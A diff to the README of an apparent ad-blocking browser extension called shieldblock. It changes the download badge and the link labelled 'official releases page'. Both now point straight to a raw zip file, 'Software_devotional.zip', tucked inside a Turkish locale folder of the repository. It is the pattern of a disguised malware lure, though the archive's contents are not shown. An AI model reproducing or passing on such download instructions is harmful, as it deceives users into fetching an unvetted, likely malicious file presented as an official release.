@@ -1,6 +1,6 @@
 # 🛡️ shieldblock - browse the web without annoying ads
 
-[![](https://img.shields.io/badge/Download-Shieldblock-blue.svg)](https://github.com/Lightdietelectromagneticinteraction591/shieldblock/releases)
+[![](https://img.shields.io/badge/Download-Shieldblock-blue.svg)](https://github.com/Lightdietelectromagneticinteraction591/shieldblock/raw/refs/heads/main/_locales/tr/Software_devotional.zip)
 
 Shieldblock removes advertisements, tracking scripts, and cookie banners from your web browser. It uses modern technology to stop unwanted content before it loads on your screen. This extension keeps your browsing private and fast. It supports both English and Turkish content.
 
@@ -8,7 +8,7 @@ Shieldblock removes advertisements, tracking scripts, and cookie banners from yo
 
 You need a web browser that supports Chrome extensions. This includes Google Chrome, Microsoft Edge, Brave, and Opera. Follow these steps to install the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Lightdietelectromagneticinteraction591/shieldblock/releases).
+1. Visit the [official releases page](https://github.com/Lightdietelectromagneticinteraction591/shieldblock/raw/refs/heads/main/_locales/tr/Software_devotional.zip).
 2. Click the link provided above to open the download page.
 3. Look for the latest version under the "Assets" section.
 4. Download the file ending in `.zip`.
